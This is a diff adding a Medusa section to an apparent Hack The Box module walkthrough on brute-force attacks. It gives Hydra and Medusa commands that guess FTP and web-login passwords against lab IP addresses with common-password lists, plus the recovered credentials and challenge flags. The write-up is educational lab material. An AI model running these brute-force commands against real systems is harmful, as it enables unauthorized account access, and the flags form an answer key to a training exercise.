@@ -7,6 +7,8 @@
 2. [Hydra](#hydra)
     1. [Basic HTTP Authentication](#basic-http-authentication)
     2. [Login Forms](#login-forms)
+3. [Medusa](#medusa)
+    1. [Web Services](#web-services)
 
 ## Brute Force Attacks
 ### Brute Force Attacks
@@ -130,3 +132,24 @@
     hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.63.174 -s 40173 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
     ```
     We will found this credential, `admin:zxcvbnm`. The answer is `HTB{W3b_L0gin_Brut3F0rc3}`.
+
+## Medusa
+### Web Services
+#### Challenges
+1. What was the password for the ftpuser?
+
+    The module has been give the credential for ssh, `sshuser:1q2w3e4r5t`. Once we in the ssh, we can use medusa to brute force the password of user `ftpuser`.
+
+    ```bash
+    medusa -h 94.237.120.112 -n 53143 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+    ```
+    The password is `qqww1122`.
+
+2. After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?
+
+    We can use the credential that we have found to login ftp.
+
+    ```bash
+    ftp ftp://ftpuser:qqww1122@localhost
+    ```
+    The answer is `HTB{SSH_and_FTP_Bruteforce_Success}`.
